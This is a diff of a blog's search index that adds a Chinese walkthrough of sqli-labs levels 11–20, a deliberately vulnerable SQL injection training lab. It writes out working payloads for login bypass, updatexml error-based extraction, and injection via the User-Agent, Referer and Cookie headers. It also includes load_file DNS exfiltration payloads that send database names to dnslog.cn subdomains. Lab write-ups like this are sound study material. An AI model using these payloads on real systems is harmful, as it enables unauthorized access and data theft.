@@ -39,7 +39,7 @@
 <h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
 <p>进入git bash中，按顺序输入如下代码：</p>
 <blockquote>
-<p>git config –global user.email “<a href="mailto:&#120;&#120;&#120;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#120;&#120;&#120;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a>“    //填写注册github的邮箱</p>
+<p>git config –global user.email “<a href="mailto:&#120;&#120;&#120;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#120;&#120;&#120;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p>
 </blockquote>
 <blockquote>
 <p>git config –global user.name “xxxx”    //github 用户名</p>
@@ -420,11 +420,92 @@
       </tags>
   </entry>
   <entry>
+    <title>sql-labs-less-11~20</title>
+    <url>/2021/02/10/sql/sql-labs/sql-labs-Less-11~20/</url>
+    <content><![CDATA[<p>sql-labs-less-11~20</p>
+<a id="more"></a>
+<h1 id="Less-11-基于’-的POST型注入"><a href="#Less-11-基于’-的POST型注入" class="headerlink" title="Less-11-基于’ 的POST型注入"></a>Less-11-基于’ 的POST型注入</h1><p>首先测试注入点</p>
+<blockquote>
+<p>id=1’ and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210208113829324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现是password那块有问题，于是想到可能是–+注释被ban掉了<br>所以使用#注释</p>
+<blockquote>
+<p>id=1’ and 1=1 #</p>
+</blockquote>
+<p>成功<br><img src="https://img-blog.csdnimg.cn/2021020811392689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后是payload</p>
+<blockquote>
+<p>1’ or 1=1 #</p>
+</blockquote>
+<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114314457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-12-基于”-的POST型注入"><a href="#Less-12-基于”-的POST型注入" class="headerlink" title="Less-12-基于”) 的POST型注入"></a>Less-12-基于”) 的POST型注入</h1><p>看题目说是双引号，于是尝试构造payload</p>
+<blockquote>
+<p>1” ‘ or 1=1 #</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210208114615375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">查看报错，发现其实是”) 闭合<br>所以重新来一次</p>
+<blockquote>
+<p>1”) or 1=1 #</p>
+</blockquote>
+<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114706613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-13-基于’-的报错注入"><a href="#Less-13-基于’-的报错注入" class="headerlink" title="Less-13-基于’) 的报错注入"></a>Less-13-基于’) 的报错注入</h1><p>根据题目可以知道是基于) 的报错注入，于是构造测试payload，发现其实是’) 闭合</p>
+<blockquote>
+<p>1’) or 1=1 #</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210208115425692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>测试显示点发现，这题没有显示点</p>
+<blockquote>
+<p>-1’) union select 1,2 #</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210208115804234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">所以准备用报错注入</p>
+<blockquote>
+<p>-1’) union select updatexml(1,concat(“~”,user(),”—“),1) #</p>
+</blockquote>
+<p>注入成功<br><img src="https://img-blog.csdnimg.cn/2021020812002514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-14-基于”-的报错注入"><a href="#Less-14-基于”-的报错注入" class="headerlink" title="Less-14-基于”  的报错注入"></a>Less-14-基于”  的报错注入</h1><p>根据题目知道，这题是双引号闭合<br>于是构造payload</p>
+<blockquote>
+<p>1” or 1=1 #</p>
+</blockquote>
+<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208120148961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>与上题一样，没有显示点</p>
+<blockquote>
+<p>-1” union select 1,2 #</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210208120244193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>于是使用报错注入</p>
+<blockquote>
+<p>-1” union select updatexml(1,concat(“<del>“,user(),”</del>“),1) #</p>
+</blockquote>
+<p>成功注入<br><img src="https://img-blog.csdnimg.cn/20210208120357507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-15-基于’-的POST型注入"><a href="#Less-15-基于’-的POST型注入" class="headerlink" title="Less-15-基于’ 的POST型注入"></a>Less-15-基于’ 的POST型注入</h1><p>根据提示可知，这题是用的布尔盲注，所以可以尝试使用dns传值<br>首先构造payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.rao80k.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021020911571117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210209115721303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">成功传值</p>
+<h1 id="Less-16-基于”-的POST型注入"><a href="#Less-16-基于”-的POST型注入" class="headerlink" title="Less-16-基于”) 的POST型注入"></a>Less-16-基于”) 的POST型注入</h1><p>这题同上，可以用dns传值<br>构造一下payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;) and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.e8vwb8.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure>
+<p>tips：最开始用1”) 发现一直注入不成功<br>后来仔细看的时候突然发现mysql注入的值是username<br>前几题都能行，所以一时间没看出来ε = = (づ′▽`)づ<br><img src="https://img-blog.csdnimg.cn/20210209133959999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-17-基于’-的密码注入"><a href="#Less-17-基于’-的密码注入" class="headerlink" title="Less-17-基于’ 的密码注入"></a>Less-17-基于’ 的密码注入</h1><p>这题刚开始的时候用老套路在username那整了好一会，发现怎么都注入不成功，然后突然发现上方有一个[PASSWORD RESET]<br>才反应过来这题可能是从password中注入，老眼瞎了(ˇωˇ」∠)_<br>试着构造了一下payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure>
+<p>tips：这题使用了update函数，所以username得是正确的，这里以admin为例</p>
+<p><img src="https://img-blog.csdnimg.cn/20210210111924293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-18-基于’-的user-agent报头文件注入"><a href="#Less-18-基于’-的user-agent报头文件注入" class="headerlink" title="Less-18-基于’ 的user-agent报头文件注入"></a>Less-18-基于’ 的user-agent报头文件注入</h1><p>这关不看源代码感觉还真不好整，瞎吉尔整了半天，结果一看源代码才知道是用user-agent报头文件注入的<em>(:3⌒ﾞ)</em><br>正好是第一次遇见这种类型题，去找了一下大致解法<br>由于锁username和password了，所以要先知道username和password才可以进行下一步<br>于是使用burpsuite爆破用户名和密码（这种方法其实并不实用<br><img src="https://img-blog.csdnimg.cn/20210210215719507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>爆破出用户名、密码，然后进行user-agent注入<br>这里给出payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021021022004258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-19-基于’-的referer报头文件注入"><a href="#Less-19-基于’-的referer报头文件注入" class="headerlink" title="Less-19-基于’ 的referer报头文件注入"></a>Less-19-基于’ 的referer报头文件注入</h1><p>这题跟上题一样，但是是referer的报头文件注入<br>这里是payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210210220649426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-20-基于’-的cookie注入"><a href="#Less-20-基于’-的cookie注入" class="headerlink" title="Less-20-基于’ 的cookie注入"></a>Less-20-基于’ 的cookie注入</h1><p>这题是真的整了好久，刚看到这题的时候我以为跟前几道报头注入的题一样，更改一下报头就行了，但是尝试了好一会发现不行。＿|￣|○<br>于是感觉可能是代码更改过了，跟前几题的代码不一样，所以去看了一下源代码，发现确实不一样了，闭合点改了，所以重新修改了一下payload交上去发现还是不行。(｀Д´*)<br>最后选择去看了看网上的payload，发现是因为这题username,password,submit都限定了，只要提交了username和password就进不去注入点，由于我是用burpsuite的重发器进行payload测试的，所以一直卡在那里。┐(￣ヮ￣)┌<br>这里是payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;&#39;union select 1,2,(updatexml(1,concat(0x7e,database(),0x7e),1)) #;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210210222517580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql-labs-less-1~10</title>
     <url>/2021/02/07/sql/sql-labs/sql-labs-Less-1~10/</url>
-    <content><![CDATA[<p>sql-labs-Less-1~10</p>
+    <content><![CDATA[<p>sql-labs-less-1~10</p>
 <a id="more"></a>
-<p>@<a href="%E7%9B%AE%E5%BD%95">toc</a></p>
+
 <h1 id="Less-1-基于’-的字符型注入"><a href="#Less-1-基于’-的字符型注入" class="headerlink" title="Less-1-基于’ 的字符型注入"></a>Less-1-基于’ 的字符型注入</h1><p>进去后老套路</p>
 <p>先测试一下注入点</p>
 <blockquote>
